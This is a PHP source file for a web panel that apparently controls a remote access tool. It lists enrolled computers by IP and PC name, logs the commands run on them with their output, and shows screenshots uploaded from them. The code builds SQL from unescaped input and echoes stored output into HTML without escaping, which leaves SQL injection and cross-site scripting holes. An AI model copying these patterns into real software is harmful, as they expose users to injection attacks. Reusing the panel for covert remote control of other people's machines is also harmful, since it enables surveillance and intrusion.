<?php

require 'Utils.php';
$Utils = new Utils();
$Utils->ConnectCheck();



function UpdateNewCommand($Type) {
    $query = "INSERT INTO UpdateChecker (Type) VALUES ('$Type')";
    mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
    return true;
}

function GetLastCommandID() {
    $query = "SELECT * FROM UpdateChecker ORDER BY `ID` DESC";
    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));

    if (mysqli_num_rows($rows) == 0) {
        echo "Database is empty <br>";
    } else {
        while ($row = mysqli_fetch_assoc($rows)) {
            return $row['ID'];
        }
    }
    return 1323123;
}



if (isset($_GET['Clear'])) {
    $query = "truncate RemoteRegister";
    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
}
if (isset($_GET['ClearSS'])) {
    $query = "truncate UploadSS";
    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
}
if (isset($_GET['ClearOutput'])) {
    $query = "truncate Commands";
    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
}

if (isset($_GET['CmdLog'])) {
    ?>
    <iframe width="500" height="160" src="Remote.php?AddCmd=1" id="RemoteInput" Class="RemoteInput">
    </iframe>
    <br>

    <?php
    $Page = (isset($_GET['Page'])) ? $Utils->FormatString($_GET['Page']) : 0;
    $Limit = 20;
    $Limit2 = ($Limit * $Page);
    $query = "SELECT * FROM Commands ORDER BY `ID` DESC LIMIT " . $Limit2 . ", " . ($Limit2 + $Limit) . "";
    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
    ?>
    
    <div style="width: 450px;" onclick="ClickCheckUpdate();" class="Button">
        <a id="RefreshTime">5</a>sec until AutoRefresh - Click for Instant Update
    </div>
    <br>
    <div>
        <label> Automatic remove opacity: </label>
        <label onclick="ChangeAutoOpactity();" class="SliderButton">
            <input id="AutomaticOpacityRemover" type="checkbox" <?php echo (isset($_COOKIE['AutoRemoveOpacity']))? (($_COOKIE['AutoRemoveOpacity'] === "true")? "checked" : "") : "" ;?> />
            <div>&nbsp</div>
        </label>
        <br>
    </div>
    <div id="ShowOpacityMAIN">
        <label> Dont even show opacity: </label>
        <label onclick="ChangeShowOpactity();" class="SliderButton">
            <input id="ShowOpacity" type="checkbox" <?php echo (isset($_COOKIE['ShowOpacity']))? (($_COOKIE['ShowOpacity'] === "true")? "checked" : "") : "" ;?> />
            <div>&nbsp</div>
        </label>
    </div>
    <br>
    <a class="Button" href='RemoteFrontend.php?CmdLog=1&Page=<?php echo ($Page - 1); ?>'>Previous Page</a> 
    &nbsp  &nbsp <a class="Button" onclick='YesNoQ("Are you sure you want to clear the log?", "ClearLogYes()", "$(\"YesNo\").slideUp(500)")'>Clear Output-Log</a> &nbsp &nbsp
    <a class="Button" href='RemoteFrontend.php?CmdLog=1&Page=<?php echo ($Page + 1); ?>'>Next Page</a>
    <br>
    <br>
    <?php
    if (mysqli_num_rows($rows) == 0) {
        echo "Database is empty <br>";
    } else {
        ?><table class="Selector Selectortable">
                <tr class="Selector" id="MainSelector">
                    <th id="SelectorIdMain" class="Selector SelectorID" style="background-color: #ffc107; color: white; "> Id </th>
                    <th id="SelectorIpMain" class="Selector SelectorIP" style="background-color: #ffc107; color: white; "> IP </th>
                    <th id="SelectorUpdatedMain" class="Selector SelectorUPDATED" style="background-color: #ffc107; color: white; "> LastUpdated </th>
                    <th id="SelectorRunningMain" class="Selector SelectorRUNNING" style="background-color: #ffeb3b; color: white; "> Running </th>
                    <th id="SelectorDoneMain" class="Selector SelectorDONE" style="background-color: #ffeb3b; color: white; "> Done </th>
                    <th id="SelectorCommandMain" class="Selector SelectorCOMMAND" style="background-color: #ffc107; color: white; "> Command </th>
                    <th id="SelectorOutputMain" class="Selector SelectorOUTPUT" style="background-color: #ffc107; color: white; "> Output </th>
                </tr>
                <tbody id="SelectorTable">
        <?php

        while ($row = mysqli_fetch_assoc($rows)) {
            $Running = ($row['Running'] == 1) ? 'True' : 'False';
            $Done = ($row['Done'] == 1) ? 'True' : 'False';
            $RunningClass = ($row['Running'] == 1) ? 'SelectorGREEN' : 'SelectorRED';
            $DoneClass = ($row['Done'] == 1) ? 'SelectorGREEN' : 'SelectorRED';
            //$Output = str_replace(" ","&nbsp;",$row['Output']);
            $Output = $row['Output'];
            $Id = $row['ID'];
            echo "<tr class=\"Selector\" UniID=\"" . $row['UniID'] . "\"  id=\"SelectorID" . $Id . "\">";
            echo "<th class=\"Selector SelectorID \"> " . $Id . " </th>";
            echo "<th class=\"Selector SelectorIP \"> " . $row['IP'] . " </th>";
            echo "<th class=\"Selector SelectorUPDATED \"> " . $row['Date'] . " </th>";
            echo "<th class=\"Selector SelectorRUNNING $RunningClass\"> " . $Running . " </th>";
            echo "<th class=\"Selector SelectorDONE $DoneClass\"> " . $Done . " </th>";
            echo "<th class=\"Selector SelectorCOMMAND \"> " . $row['Command'] . ": " . $row['Args'] . " </th>";
            echo "<th class=\"Selector SelectorOUTPUT \"> <div>" . $Output . "</div> </th>";
            echo "</tr>";
        }
        echo '</tbody></table>';
    }
    ?>
    <br>
    <a class="Button" href='RemoteFrontend.php?CmdLog=1&Page=<?php echo ($Page - 1); ?>'>Previous Page</a> 
    &nbsp  &nbsp <a class="Button" href='RemoteFrontend.php?CmdLog=1'>MainPage</a> &nbsp &nbsp
    <a class="Button" href='RemoteFrontend.php?CmdLog=1&Page=<?php echo ($Page + 1); ?>'>Next Page</a><br>
    <?php
}




if (isset($_GET['SSLog'])) {
    
    $Page = (isset($_GET['Page'])) ? $Utils->FormatString($_GET['Page']) : 0;
    ?>
    <a class="Button" href='RemoteFrontend.php?SSLog=1&Page=<?php echo ($Page - 1); ?>'>Previous Page</a> 
    &nbsp  &nbsp <a class="Button" onclick='YesNoQ("Are you sure you want to clear the SSlog?", "ClearSSLogYes()", "$(\"YesNo\").slideUp(500)")'>Clear SS-Log</a> &nbsp &nbsp
    <a class="Button" href='RemoteFrontend.php?SSLog=1&Page=<?php echo ($Page + 1); ?>'>Next Page</a>
    <?php
    $Limit = 2;
    $Limit2 = ($Limit * $Page);
    
    $query = "SELECT * FROM UploadSS ORDER BY `id` DESC LIMIT " . $Limit2 . ", " . ($Limit2 + $Limit) . "";
    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
    if (mysqli_num_rows($rows) == 0) {
        echo "Database is empty <br>";
    }
    while ($row = mysqli_fetch_assoc($rows)) {
        $Cont = base64_encode($row['content']);
        $Info = "Screenshot Id: " . $row['id'];
        echo " 
            <figure>
                <img title=\"Click to show fullscreen\" onclick=\"ResizePicture(this);\" class=\"Pika\" id=\"Pika".$row['id']."\" src=\"data:image/png;base64,$Cont\" alt=\"" . $Info . "\" />
                <figcaption>" . $Info . "</figcaption>
            </figure>
            <br> 
            <br>
            <br>
            <br>
            <br>
        ";
    }
    ?>
    <a class="Button" href='RemoteFrontend.php?SSLog=1&Page=<?php echo ($Page - 1); ?>'>Previous Page</a> 
    &nbsp  &nbsp <a class="Button" href='RemoteFrontend.php?SSLog=1'>MainPage</a> &nbsp &nbsp
    <a class="Button" href='RemoteFrontend.php?SSLog=1&Page=<?php echo ($Page + 1); ?>'>Next Page</a><br>
    <?php
}

if (isset($_GET['Log'])) {
    $query = "SELECT id, IP, date, PCName FROM RemoteRegister ORDER BY `id` DESC";
    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
    echo "<a href='Remote.php?Clear=1'>Clear Log</a><br>";
    if (mysqli_num_rows($rows) == 0) {
        echo "Database is empty <br>";
    } else {
        echo '<table class="Selector">
                    <tr class="Selector">
                        <th class="Selector"> Id </th>
                        <th class="Selector"> IP </th>
                        <th class="Selector"> Date </th>
                        <th class="Selector"> PCName </th>
                    </tr>
        ';

        while ($row = mysqli_fetch_assoc($rows)) {
            echo "<tr class=\"Selector\">";
            echo "<th class=\"Selector\"> " . $row['id'] . " </th>";
            echo "<th class=\"Selector\"> " . $row['IP'] . " </th>";
            echo "<th class=\"Selector\"> " . $row['date'] . " </th>";
            echo "<th class=\"Selector\"> " . $row['PCName'] . " </th>";
            echo "</tr>";
            //<a href=\"download.php?id=". $row['id'] . "\">" . $row['name'] . "</a>
        }
        echo '</table>';
    }
}



$Utils->LastLoad();